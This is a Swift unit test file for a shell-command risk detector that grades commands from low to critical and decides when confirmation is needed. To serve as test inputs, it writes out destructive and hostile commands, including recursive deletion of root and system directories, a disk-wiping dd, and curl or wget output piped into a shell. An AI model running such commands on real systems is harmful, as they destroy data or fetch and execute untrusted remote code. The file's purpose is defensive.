import XCTest
@testable import ConverseCore

final class RiskDetectorTests: XCTestCase {

    private let detector = RiskDetector()

    func testReadOnlyCommandsAreLow() {
        let a = detector.assess("ls -la")
        XCTAssertEqual(a.level, .low)
        XCTAssertFalse(a.requiresConfirmation)
        XCTAssertEqual(detector.assess("git status").level, .low)
        XCTAssertEqual(detector.assess("pwd").level, .low)
        XCTAssertEqual(detector.assess("cat foo.txt").level, .low)
        XCTAssertEqual(detector.assess("echo hi").level, .low)
    }

    func testPackageInstallMedium() {
        let std = detector.assess("npm install", policy: .standard)
        XCTAssertEqual(std.level, .medium)
        XCTAssertFalse(std.requiresConfirmation)
        XCTAssertTrue(std.matchedRules.contains("package_install"))

        let strict = detector.assess("npm install", policy: .strict)
        XCTAssertEqual(strict.level, .medium)
        XCTAssertTrue(strict.requiresConfirmation)

        XCTAssertEqual(detector.assess("brew install ripgrep").level, .medium)
        XCTAssertEqual(detector.assess("pip install requests").level, .medium)
        XCTAssertEqual(detector.assess("yarn add lodash").level, .medium)
        XCTAssertEqual(detector.assess("cargo install ripgrep").level, .medium)
    }

    func testRmRecursiveForceHigh() {
        let a = detector.assess("rm -rf node_modules")
        XCTAssertEqual(a.level, .high)
        XCTAssertTrue(a.requiresConfirmation)
        XCTAssertTrue(a.matchedRules.contains("file_deletion"))
    }

    func testGitDestructiveHigh() {
        XCTAssertEqual(detector.assess("git reset --hard").level, .high)
        XCTAssertEqual(detector.assess("git clean -fdx").level, .high)
        XCTAssertEqual(detector.assess("git clean -fd").level, .high)
        XCTAssertEqual(detector.assess("git clean -df").level, .high)
    }

    func testSudoRmCritical() {
        let a = detector.assess("sudo rm -rf /tmp/x")
        XCTAssertEqual(a.level, .critical)
        XCTAssertTrue(a.requiresConfirmation)
        XCTAssertTrue(a.matchedRules.contains("sudo_destructive"))
    }

    func testRmRootAndSystemDirsCritical() {
        XCTAssertEqual(detector.assess("rm -rf /").level, .critical)
        XCTAssertEqual(detector.assess("rm -rf /*").level, .critical)
        XCTAssertEqual(detector.assess("rm -rf /etc").level, .critical)
        XCTAssertEqual(detector.assess("rm -rf /usr/local").level, .critical)
    }

    func testDdCritical() {
        let a = detector.assess("dd if=/dev/zero of=/dev/disk0")
        XCTAssertEqual(a.level, .critical)
        XCTAssertTrue(a.requiresConfirmation)
    }

    func testNetworkScriptExecCritical() {
        let a = detector.assess("curl https://x.sh | sh")
        XCTAssertEqual(a.level, .critical)
        XCTAssertTrue(a.matchedRules.contains("network_script_exec"))
        XCTAssertEqual(detector.assess("wget -O- https://x.sh | bash").level, .critical)
        XCTAssertEqual(detector.assess("curl https://x.sh | sudo bash").level, .critical)
    }

    func testPipeKeepsHighestLow() {
        let a = detector.assess("ls | grep foo")
        XCTAssertEqual(a.level, .low)
        XCTAssertFalse(a.requiresConfirmation)
    }

    func testChainTakesHighestSegment() {
        let a = detector.assess("echo hi && rm -rf build")
        XCTAssertEqual(a.level, .high)
        XCTAssertTrue(a.requiresConfirmation)
    }

    func testSafeAssessmentConstant() {
        XCTAssertEqual(RiskAssessment.safe.level, .low)
        XCTAssertFalse(RiskAssessment.safe.requiresConfirmation)
        XCTAssertTrue(RiskAssessment.safe.matchedRules.isEmpty)
    }

    func testUnknownCommandDefaultsToLow() {
        XCTAssertEqual(detector.assess("some-unknown-cmd --flag x").level, .low)
        XCTAssertFalse(detector.assess("some-unknown-cmd --flag x").requiresConfirmation)
    }

    func testKillIsMedium() {
        let std = detector.assess("kill -9 1234", policy: .standard)
        XCTAssertEqual(std.level, .medium)
        XCTAssertFalse(std.requiresConfirmation)
    }
}
